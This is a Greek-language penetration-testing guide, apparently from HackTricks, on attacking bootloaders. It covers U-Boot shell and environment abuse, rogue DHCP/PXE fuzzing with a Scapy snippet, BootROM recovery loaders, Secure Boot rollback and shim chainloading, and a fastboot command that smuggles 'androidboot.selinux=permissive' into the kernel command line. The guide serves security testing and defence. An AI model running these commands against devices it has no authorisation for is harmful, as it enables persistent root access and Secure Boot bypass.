# Δοκιμές Bootloader

{{#include ../../banners/hacktricks-training.md}}

Τα παρακάτω βήματα συνιστώνται για την τροποποίηση των διαμορφώσεων εκκίνησης συσκευών και τον έλεγχο bootloader όπως το U-Boot και οι bootloader κλάσης UEFI. Εστιάστε στην απόκτηση εκτέλεσης κώδικα σε πρώιμο στάδιο, στην αξιολόγηση των προστασιών υπογραφής/rollback και στην κατάχρηση διαδρομών recovery ή network boot.

Σχετικό: παράκαμψη secure boot του MediaTek μέσω patching του bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Γρήγορες νίκες στο U-Boot και κατάχρηση του περιβάλλοντος

1. Πρόσβαση στο κέλυφος του interpreter
   - Κατά την εκκίνηση, πατήστε ένα γνωστό πλήκτρο διακοπής (συχνά οποιοδήποτε πλήκτρο, 0, space ή έναν ειδικό συνδυασμό πλήκτρων της πλακέτας) πριν εκτελεστεί το `bootcmd`, για να εμφανιστεί το prompt του U-Boot.<sup>[[1]](#references)</sup>

2. Έλεγχος κατάστασης εκκίνησης και μεταβλητών
   - Χρήσιμες εντολές:
     - `printenv` (εμφάνιση του περιβάλλοντος)
     - `bdinfo` (πληροφορίες πλακέτας, διευθύνσεις μνήμης)
     - `help bootm; help booti; help bootz` (υποστηριζόμενες μέθοδοι εκκίνησης kernel)
     - `help ext4load; help fatload; help tftpboot` (διαθέσιμοι loaders)

3. Τροποποίηση των ορισμάτων εκκίνησης για να αποκτήσετε root shell
   - Προσθέστε το `init=/bin/sh`, ώστε ο kernel να ανοίξει ένα shell αντί να εκκινήσει το κανονικό init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot από τον TFTP server σας
   - Ρυθμίστε το δίκτυο και ανακτήστε ένα kernel/fit image από το LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Διατήρηση αλλαγών μέσω environment
   - Αν η αποθήκευση env δεν προστατεύεται από εγγραφή, μπορείτε να διατηρήσετε τον έλεγχο:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Ελέγξτε για μεταβλητές όπως `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` που επηρεάζουν τις διαδρομές εναλλακτικής εκκίνησης. Οι λανθασμένα ρυθμισμένες τιμές μπορεί να επιτρέπουν επανειλημμένη πρόσβαση στο shell.

6. Έλεγχος λειτουργιών debugging/μη ασφαλών λειτουργιών
   - Αναζητήστε: `bootdelay` > 0, απενεργοποιημένο `autoboot`, απεριόριστο `usb start; fatload usb 0:1 ...`, δυνατότητα χρήσης `loady`/`loads` μέσω serial, `env import` από μη έμπιστα μέσα και kernels/ramdisks που φορτώνονται χωρίς ελέγχους υπογραφής.

7. Έλεγχος εικόνων U-Boot/επαλήθευσης
   - Αν η πλατφόρμα ισχυρίζεται ότι χρησιμοποιεί secure/verified boot με FIT images, δοκιμάστε τόσο unsigned όσο και tampered images:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Η απουσία των `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ή η συμπεριφορά του legacy `verify=n` συχνά επιτρέπει την εκκίνηση αυθαίρετων payloads.
   - Μην περιορίζεστε σε ένα απλό αποτέλεσμα allow/deny: πρόσφατη έρευνα για το FIT έδειξε ότι η ίδια η διαδρομή επαλήθευσης μπορεί να αποτελεί επιφάνεια επίθεσης pre-auth. Κάντε αρνητικές δοκιμές σε εξωτερικά αποθηκευμένα δεδομένα FIT (`data-offset`, `data-position`, `data-size`), στην επιλογή υπογεγραμμένων διαμορφώσεων, στα `loadables` και στον χειρισμό overlay / `extra-conf`.
   - Αν έχετε αντίστοιχο source tree, το `test/vboot/vboot_test.sh` είναι ένας γρήγορος τρόπος να αναπαραγάγετε τη συμπεριφορά επαλήθευσης FIT στο U-Boot sandbox πριν δοκιμάσετε πραγματικό hardware.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` και ροές εκκίνησης μέσω script
   - Σε σύγχρονα builds του U-Boot, το `bootcmd` είναι συχνά απλώς ένα wrapper γύρω από το Standard Boot. Αυτό σημαίνει ότι τα εγγράψιμα μέσα, το PXE ή η SPI flash μπορούν να αποτελέσουν το πραγματικό όριο εμπιστοσύνης, ακόμη κι όταν το ορατό περιβάλλον φαίνεται ακίνδυνο.
   - Το `extlinux` bootmeth αναζητά το `extlinux/extlinux.conf` στους καταλόγους `/` και `/boot`, ενώ το script bootmeth αναζητά πρώτα το `boot.scr.uimg` και έπειτα το `boot.scr`. Κατά την εκκίνηση μέσω δικτύου, το όνομα του script μπορεί να προέρχεται από το `boot_script_dhcp`.
   - Χρήσιμες εντολές αρχικής διαλογής:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Περιπτώσεις κατάχρησης προς έλεγχο: μέσα USB/SD που ελέγχει ο attacker και βρίσκονται νωρίτερα στο `boot_targets`, εγγράψιμο `/boot/extlinux/extlinux.conf`, rogue TFTP που παρέχει `boot.scr` ή εκτέλεση script μέσω SPI με το `script_offset_f`.
   - Αν η πλατφόρμα βασίζεται σε FIT verification, βεβαιωθείτε ότι οι configurations είναι signed σε επίπεδο configuration και όχι μόνο ανά image· το `required-mode=all` είναι ισχυρότερο από την αποδοχή οποιουδήποτε μεμονωμένου required key.

## Επιφάνεια network-boot (DHCP/PXE) και rogue servers

9. Fuzzing παραμέτρων PXE/DHCP
   - Ο legacy χειρισμός BOOTP/DHCP του U-Boot είχε προβλήματα memory-safety. Για παράδειγμα, το CVE‑2024‑42040 περιγράφει memory disclosure μέσω ειδικά διαμορφωμένων DHCP responses, τα οποία μπορούν να κάνουν leak bytes από τη μνήμη του U-Boot μέσω δικτύου.<sup>[[4]](#references)</sup> Δοκιμάστε τα code paths DHCP/PXE με υπερβολικά μεγάλες τιμές ή τιμές οριακών περιπτώσεων (bootfile-name της option 67, vendor options, πεδία file/servername) και παρατηρήστε για hangs/leaks.
   - Ελάχιστο Scapy snippet για stress test των boot parameters κατά το netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Ελέγξτε επίσης αν τα πεδία ονόματος αρχείου PXE περνούν στη λογική του shell/loader χωρίς sanitization, όταν συνδέονται με scripts provisioning στην πλευρά του OS.

10. Testing για command injection σε rogue DHCP server
   - Ρυθμίστε μια rogue υπηρεσία DHCP/PXE και δοκιμάστε να εισαγάγετε χαρακτήρες στα πεδία filename ή options, ώστε να φτάσουν σε command interpreters σε μεταγενέστερα στάδια της αλυσίδας εκκίνησης. Τα βοηθητικά προγράμματα DHCP του Metasploit, το `dnsmasq` ή προσαρμοσμένα scripts Scapy είναι κατάλληλα. Φροντίστε πρώτα να απομονώσετε το δίκτυο του lab.

## Recovery modes του SoC ROM που παρακάμπτουν την κανονική εκκίνηση

Πολλά SoC εκθέτουν μια λειτουργία "loader" του BootROM, η οποία δέχεται κώδικα μέσω USB/UART ακόμη κι όταν τα flash images είναι μη έγκυρα. Αν δεν έχουν καεί τα secure-boot fuses, αυτό μπορεί να προσφέρει arbitrary code execution σε πολύ πρώιμο στάδιο της αλυσίδας.

- NXP i.MX (Serial Download Mode)
  - Εργαλεία: `uuu` (mfgtools3) ή `imx-usb-loader`.
  - Παράδειγμα: `imx-usb-loader u-boot.imx` για να στείλετε και να εκτελέσετε ένα προσαρμοσμένο U-Boot από τη RAM.
- Allwinner (FEL)
  - Εργαλείο: `sunxi-fel`.
  - Παράδειγμα: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ή `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Εργαλείο: `rkdeveloptool`.
  - Παράδειγμα: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` για να προετοιμάσετε έναν loader και να ανεβάσετε ένα προσαρμοσμένο U-Boot.

Ελέγξτε αν έχουν καεί τα secure-boot eFuses/OTP της συσκευής. Αν όχι, οι λειτουργίες λήψης του BootROM συχνά παρακάμπτουν κάθε επαλήθευση ανώτερου επιπέδου (U-Boot, kernel, rootfs), εκτελώντας απευθείας το payload πρώτου σταδίου από τη SRAM/DRAM.

## Bootloaders UEFI/κλάσης PC: γρήγοροι έλεγχοι

11. Έλεγχος παραποίησης, rollback και εγγραφής κλειδιών στο ESP
   - Κάντε mount το EFI System Partition (ESP) και ελέγξτε για components του loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, διαδρομές λογότυπων κατασκευαστή.
   - Εξαγάγετε την κατάσταση του Secure Boot και τις βάσεις δεδομένων κλειδιών από το OS, αν είναι δυνατό:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Αν η πλατφόρμα βρίσκεται σε Setup Mode, δέχεται εγγραφή κλειδιών χωρίς έλεγχο ταυτότητας ή αποστέλλεται με δοκιμαστικό/προεπιλεγμένο Platform Key (κλάση PKfail), ένας τοπικός admin ή ένας εισβολέας με φυσική πρόσβαση μπορεί να εγγράψει το δικό του KEK/db και να διατηρήσει την εμφάνιση ότι το Secure Boot είναι «ενεργοποιημένο», ενώ εκκινεί αυθαίρετα EFI binaries.<sup>[[3]](#references)</sup>
   - Δοκιμάστε εκκίνηση με υποβαθμισμένα ή γνωστά ευάλωτα υπογεγραμμένα boot components, αν οι ανακλήσεις Secure Boot (dbx) δεν είναι ενημερωμένες. Αν η πλατφόρμα εξακολουθεί να εμπιστεύεται παλιά shims/bootmanagers, μπορείτε συχνά να φορτώσετε τον δικό σας kernel ή `grub.cfg` από το ESP για να αποκτήσετε persistence.

12. Έλεγχος ανακλήσεων για παλιά shim / SBAT / dbx
   - Παλιά shims υπογεγραμμένα από τη Microsoft και forks προμηθευτών μπορούν ακόμη να αποτελέσουν διαδρομή bootkit τύπου BYOVD, αν οι ανακλήσεις είναι παρωχημένες. Σε απομονωμένο lab, τοποθετήστε ένα ιστορικά ευάλωτο shim στο ESP και επιχειρήστε να κάνετε chainload το δικό σας `grubx64.efi` ή kernel.<sup>[[11]](#references)</sup>
   - Γρήγορη διαλογή:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Αν το shim εξακολουθεί να εκτελείται παρότι βρίσκεται στη λίστα ανάκλησης, το firmware/OS έχει παλιές ενημερώσεις `dbx` ή εμπιστεύεται έναν forked loader που δεν κληρονόμησε ποτέ τις upstream προστασίες SBAT.

13. Σφάλματα ανάλυσης λογότυπου εκκίνησης (κατηγορία LogoFAIL)
   - Αρκετά firmware OEM/IBV ήταν ευάλωτα σε σφάλματα ανάλυσης εικόνων στο DXE, κατά την επεξεργασία λογοτύπων εκκίνησης. Αν ένας attacker μπορεί να τοποθετήσει μια ειδικά διαμορφωμένη εικόνα στο ESP, σε διαδρομή συγκεκριμένη για τον κατασκευαστή (π.χ., `\EFI\<vendor>\logo\*.bmp`), και να κάνει επανεκκίνηση, ενδέχεται να είναι δυνατή η εκτέλεση κώδικα στα πρώτα στάδια της εκκίνησης, ακόμη κι αν είναι ενεργό το Secure Boot. Ελέγξτε αν η πλατφόρμα δέχεται λογότυπα που παρέχονται από τον χρήστη και αν αυτές οι διαδρομές είναι εγγράψιμες από το OS.<sup>[[2]](#references)</sup>


## Κενά εμπιστοσύνης Android/Qualcomm ABL + GBL (Android 16)

Σε συσκευές Android 16 που χρησιμοποιούν το ABL της Qualcomm για τη φόρτωση της **Generic Bootloader Library (GBL)**, ελέγξτε αν το ABL **επικυρώνει** την εφαρμογή UEFI που φορτώνει από το partition `efisp`. Αν το ABL ελέγχει μόνο την **παρουσία** μιας εφαρμογής UEFI και δεν επαληθεύει τις υπογραφές, μια δυνατότητα εγγραφής στο `efisp` μετατρέπεται σε **εκτέλεση unsigned κώδικα πριν από το OS** κατά την εκκίνηση.<sup>[[6]](#references)[[7]](#references)</sup>

Πρακτικοί έλεγχοι και τρόποι κατάχρησης:

- **Δυνατότητα εγγραφής στο efisp**: Χρειάζεστε τρόπο να γράψετε μια προσαρμοσμένη εφαρμογή UEFI στο `efisp` (root/προνομιούχα υπηρεσία, σφάλμα σε εφαρμογή OEM, διαδρομή recovery/fastboot). Χωρίς αυτό, το κενό στη φόρτωση του GBL δεν είναι άμεσα προσβάσιμο.<sup>[[6]](#references)</sup>
- **Έγχυση ορισμάτων fastboot OEM** (σφάλμα ABL): Ορισμένες εκδόσεις δέχονται επιπλέον tokens στο `fastboot oem set-gpu-preemption` και τα προσθέτουν στη γραμμή εντολών του kernel. Αυτό μπορεί να χρησιμοποιηθεί για να επιβληθεί permissive SELinux, επιτρέποντας εγγραφές σε προστατευμένα partitions:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Αν η συσκευή έχει διορθωθεί, η εντολή θα πρέπει να απορρίπτει επιπλέον ορίσματα.<sup>[[5]](#references)[[6]](#references)</sup>
- **Ξεκλείδωμα bootloader μέσω μόνιμων flags**: Ένα payload στο στάδιο εκκίνησης μπορεί να αλλάξει μόνιμα flags ξεκλειδώματος (π.χ., `is_unlocked=1`, `is_unlocked_critical=1`), προσομοιώνοντας το `fastboot oem unlock` χωρίς τους περιορισμούς του OEM server/έγκρισης. Αυτό αλλάζει μόνιμα την κατάσταση μετά την επόμενη επανεκκίνηση.<sup>[[6]](#references)</sup>

Σημειώσεις άμυνας/διαλογής:

- Επιβεβαιώστε αν το ABL πραγματοποιεί επαλήθευση υπογραφής του payload GBL/UEFI από το `efisp`. Αν όχι, αντιμετωπίστε το `efisp` ως επιφάνεια υψηλού κινδύνου για persistence.
- Ελέγξτε αν οι handlers fastboot OEM του ABL έχουν τροποποιηθεί ώστε να **επικυρώνουν τον αριθμό ορισμάτων** και να απορρίπτουν επιπλέον tokens.<sup>[[8]](#references)[[9]](#references)</sup>

## Προειδοποίηση για το hardware

Να είστε προσεκτικοί όταν αλληλεπιδράτε με μνήμη flash SPI/NAND κατά την πρώιμη εκκίνηση (π.χ., γείωση ακίδων για παράκαμψη αναγνώσεων) και να συμβουλεύεστε πάντα το datasheet της flash. Βραχυκυκλώματα σε λάθος χρονική στιγμή μπορούν να καταστρέψουν τη συσκευή ή τον programmer.

## Σημειώσεις και πρόσθετες συμβουλές

- Δοκιμάστε `env export -t ${loadaddr}` και `env import -t ${loadaddr}` για να μεταφέρετε blobs περιβάλλοντος μεταξύ RAM και αποθηκευτικού χώρου· ορισμένες πλατφόρμες επιτρέπουν την εισαγωγή env από αφαιρούμενα μέσα χωρίς authentication.
- Για persistence σε συστήματα που βασίζονται σε Linux και εκκινούν μέσω `extlinux.conf`, συχνά αρκεί να τροποποιήσετε τη γραμμή `APPEND` (για να εισαγάγετε `init=/bin/sh` ή `rd.break`) στο boot partition, όταν δεν εφαρμόζονται έλεγχοι υπογραφής.
- Αν ο στόχος χρησιμοποιεί ενημερώσεις dual-slot / A/B, εξετάστε τις τεχνικές anti-rollback και slot-desync στην [επισκόπηση ανάλυσης firmware](README.md), ώστε να μην παραβλέψετε κενά εμπιστοσύνης που υπάρχουν μόνο στον updater, έξω από τον ίδιο τον bootloader.
- Αν το userland παρέχει `fw_printenv/fw_setenv`, επιβεβαιώστε ότι το `/etc/fw_env.config` αντιστοιχεί στον πραγματικό χώρο αποθήκευσης env. Εσφαλμένες μετατοπίσεις επιτρέπουν την ανάγνωση/εγγραφή σε λάθος περιοχή MTD.

## References

- [1] [Μεθοδολογία ελέγχου ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Εντοπίζοντας το LogoFAIL: Οι κίνδυνοι της ανάλυσης εικόνων κατά την εκκίνηση του συστήματος](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Μη έμπιστα κλειδιά πλατφόρμας υπονομεύουν το Secure Boot στο οικοσύστημα UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Λεπτομέρειες του CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Ξεκλείδωμα Xiaomi μέσω δύο μη εξυγιασμένων συμβολοσειρών](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit του Qualcomm Snapdragon 8 Elite GBL επιτρέπει σε επιτιθέμενους να ξεκλειδώνουν bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Αρχιτεκτονική Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Διόρθωση της διοχέτευσης μη έμπιστης εισόδου στη γραμμή εντολών του kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Προσθήκη ελέγχου για την εντολή set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Ακατάλληλο για εκκίνηση: Παράκαμψη της επαλήθευσης υπογραφής FIT του U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Σημείωση ευπάθειας VU#616257 - Bootloaders shim UEFI υπογεγραμμένοι από τη Microsoft είναι ευάλωτοι σε παράκαμψη του Secure Boot](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
